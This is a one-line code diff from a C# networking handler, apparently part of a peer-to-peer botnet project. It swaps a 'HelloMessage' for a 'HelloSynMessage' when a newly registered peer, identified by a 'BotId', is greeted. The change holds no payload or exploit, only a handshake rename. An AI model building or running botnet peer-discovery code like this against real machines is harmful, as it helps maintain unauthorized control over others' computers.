@@ -23,7 +23,7 @@ namespace Vinchuca.Network.Protocol.Handlers
             {
                 if (_peerList.TryRegister(new PeerInfo(peer.BotId, peer.EndPoint)))
                 {
-                    var hello = new HelloMessage();
+                    var hello = new HelloSynMessage();
                     _messageManager.Send(hello, peer.BotId);
                 }
             }
